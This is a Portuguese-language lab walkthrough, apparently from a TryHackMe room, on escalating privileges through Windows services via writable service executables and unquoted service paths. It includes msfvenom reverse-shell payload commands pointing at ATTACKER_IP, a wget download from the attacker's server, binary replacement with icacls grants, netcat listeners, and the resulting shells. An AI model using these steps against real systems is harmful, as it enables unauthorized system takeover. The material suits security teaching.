---
tags:
  - EXPLOITATION
  - Windows
---


Os serviços do Windows são gerenciados pelo **Service Control Manager (SCM)**. O SCM é um processo encarregado de *gerenciar o estado dos serviços conforme necessário*, verificando o status atual de qualquer serviço e, em geral, fornecendo uma maneira de configurar os serviços.

==Cada serviço em um computador Windows terá um executável associado que será executado pelo SCM sempre que um serviço for iniciado==. É importante observar que os executáveis de serviço implementam funções especiais para poderem se comunicar com o SCM e, portanto, não é qualquer executável que pode ser iniciado como um serviço com êxito. Cada serviço também *especifica a conta de usuário* sob a qual o serviço será executado.

Para entender melhor a estrutura de um serviço, vamos verificar a configuração do serviço apphostsvc com o comando sc qc:

```powershell
C:\> sc qc apphostsvc
```

Aqui podemos ver que o executável associado é especificado por meio do parâmetro BINARY_PATH_NAME, e a conta usada para executar o serviço é mostrada no parâmetro SERVICE_START_NAME.

Os serviços têm uma lista de controle de acesso discricionário (DACL), que indica quem tem permissão para iniciar, parar, pausar, consultar o status, consultar a configuração ou reconfigurar o serviço, entre outros privilégios. A DACL pode ser vista no Process Hacker (disponível na área de trabalho de sua máquina):

![[Pasted image 20231222212510.png]]

Todas as configurações de serviços são armazenadas no registro em `HKLM\SYSTEM\CurrentControlSet\Services\`:

![[Pasted image 20231222212534.png]]

Existe uma subchave para cada serviço no sistema. Novamente, podemos ver o executável associado no valor ImagePath e a conta usada para iniciar o serviço no valor ObjectName. Se uma DACL tiver sido configurada para o serviço, ela será armazenada em uma subchave chamada Security. Como você já deve ter adivinhado, apenas os administradores podem modificar essas entradas de registro por padrão.

# Permissões inseguras no executável do serviço

Se o executável associado a um serviço tiver permissões fracas que permitam que um invasor o modifique ou substitua, o invasor poderá obter os privilégios da conta do serviço de forma trivial.

Para entender como isso funciona, vamos analisar uma vulnerabilidade encontrada no Splinterware System Scheduler. Para começar, consultaremos a configuração do serviço usando sc:

```powershell
C:\> sc qc WindowsScheduler
#[SC] QueryServiceConfig SUCCESS

#SERVICE_NAME: windowsscheduler
#        TYPE               : 10  WIN32_OWN_PROCESS
#        START_TYPE         : 2   AUTO_START
#        ERROR_CONTROL      : 0   IGNORE
#        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
#        LOAD_ORDER_GROUP   :#
#        TAG                : 0
#        DISPLAY_NAME       : System Scheduler Service
#        DEPENDENCIES       :
#        SERVICE_START_NAME : .\svcuser1
```

Vemos que o serviço instalado pelo software vulnerável é executado como svcuser1 e o executável associado ao serviço está em `C:\Progra~2\System~1\WService.exe`. Em seguida, verificamos as permissões do executável:

```powershell
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
#C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
#                                  NT AUTHORITY\SYSTEM:(I)(F)
#                                  BUILTIN\Administrators:(I)(F)
#                                  BUILTIN\Users:(I)(RX)
#                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
#                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

#Successfully processed 1 files; Failed processing 0 files
```
E aqui temos algo interessante. O grupo Everyone tem permissões de modificação (M) no executável do serviço. Isso significa que podemos simplesmente sobrescrevê-lo com qualquer carga útil de nossa preferência, e o serviço o executará com os privilégios da conta de usuário configurada.

Vamos gerar uma carga útil de serviço exe usando o msfvenom e servi-la por meio de um servidor da Web em python:

```shell
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...  
```

Em seguida, podemos extrair a carga útil do Powershell com o seguinte comando:

```powershell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Quando a carga útil estiver no servidor Windows, substituiremos o executável do serviço pela nossa carga útil. Como precisamos de outro usuário para executar a carga útil, também devemos conceder permissões totais ao grupo Everyone:

```powershell
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

Iniciamos um listener reverso em nosso computador do atacante:

```shell
user@attackerpc$ nc -lvp 4445
```

E, por fim, reinicie o serviço. Embora, em um cenário normal, você provavelmente teria de aguardar a reinicialização do serviço, você recebeu privilégios para reiniciar o serviço por conta própria para economizar tempo. Use os seguintes comandos em um prompt de comando cmd.exe:

```powershell
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```

Observação: o PowerShell tem sc como um alias para Set-Content, portanto, você precisa usar sc.exe para controlar os serviços com o PowerShell dessa forma.

Como resultado, você obterá um shell reverso com privilégios svcusr1:

```shell
user@attackerpc$ nc -lvp 4445
#Escutando em 0.0.0.0 4445
#Conexão recebida em 10.10.175.90 50649
#Microsoft Windows [Versão 10.0.17763.1821]
#(c) 2018 Microsoft Corporation. Todos os direitos reservados.

C:\Windows\system32>whoami
#wprivesc1\svcusr1
```

# Caminhos de serviço não cotados

Quando não podemos escrever diretamente nos executáveis de serviço como antes, ainda pode haver uma chance de forçar um serviço a executar executáveis arbitrários usando um recurso bastante obscuro.

Ao trabalhar com serviços do Windows, ocorre um comportamento muito específico quando o serviço é configurado para apontar para um executável "não citado". Por "não citado", queremos dizer que o caminho do executável associado não está devidamente citado para levar em conta os espaços no comando.

Como exemplo, vejamos a diferença entre dois serviços (esses serviços são usados apenas como exemplos e podem não estar disponíveis em seu computador). O primeiro serviço usará uma citação adequada para que o SCM saiba, sem dúvida, que deve executar o arquivo binário apontado por `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, seguido pelos parâmetros fornecidos:

```powershell
C:\> sc qc "vncserver"
```

Lembre-se: O PowerShell tem "sc" como um alias para "Set-Content", portanto, você precisa usar "sc.exe" para controlar os serviços se estiver em um prompt do PowerShell.
Agora vamos dar uma olhada em outro serviço sem a devida citação:


```powershell
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS
```

```powershell
C:\>icacls c:\MyPrograms
```

O grupo BUILTIN\\Users tem privilégios AD e WD, permitindo que o usuário crie subdiretórios e arquivos, respectivamente.

O processo de criação de uma carga útil de serviço exe com o msfvenom e sua transferência para o host de destino é o mesmo de antes, portanto, fique à vontade para criar a carga útil a seguir e carregá-la no servidor como antes. Também iniciaremos um ouvinte para receber o shell reverso quando ele for executado:

```shell
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446
```


```powershell
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

```shell
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

Como resultado, você obterá um shell reverso com privilégios svcusr2:

```powershell
user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```

Vá para a área de trabalho do svcusr2 para recuperar um sinalizador. Não se esqueça de inserir o sinalizador no final desta tarefa.

